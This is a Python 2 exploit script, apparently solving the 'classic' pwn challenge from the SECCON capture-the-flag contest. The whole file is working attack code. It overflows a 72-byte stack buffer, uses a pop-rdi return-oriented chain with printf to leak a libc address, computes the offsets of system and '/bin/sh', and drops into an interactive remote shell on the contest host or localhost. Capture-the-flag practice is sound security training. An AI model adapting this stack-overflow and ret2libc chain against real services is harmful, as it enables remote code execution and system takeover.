import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    poprdi = 0x00400753
    puts = 0x400520
    printf = 0x400540
    libc_start_got = 0x601030
    buf = "A"*72
    buf += p(poprdi)
    buf += p(libc_start_got)
    buf += p(printf)
    buf += p(0x4006a9) # back to main

    f.write(buf+"\n")
    read_until(f,"pwn!!\n")
    leak = u(f.read(6)+"\x00"*2) 
    print "leak: ",hex(leak)
    libc_base = leak - __libc_start_main_offset
    print "libc_base: ",hex(libc_base)
    system = libc_base + system_offset
    print "system: ",hex(system)
    binsh = libc_base + binsh_offset
    print "binsh: ",hex(binsh)

    buf = "A"*72
    buf += p(poprdi)
    buf += p(binsh)
    buf += p(system)
    f.write(buf+"\n")

    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("classic.pwn.seccon.jp", 17354)
        system_offset = 0x0000000000045390
        __libc_start_main_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
        main()
    else:
        s, f = sock("localhost", 17354)
        system_offset = 0x0000000000045390
        __libc_start_main_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
        main()
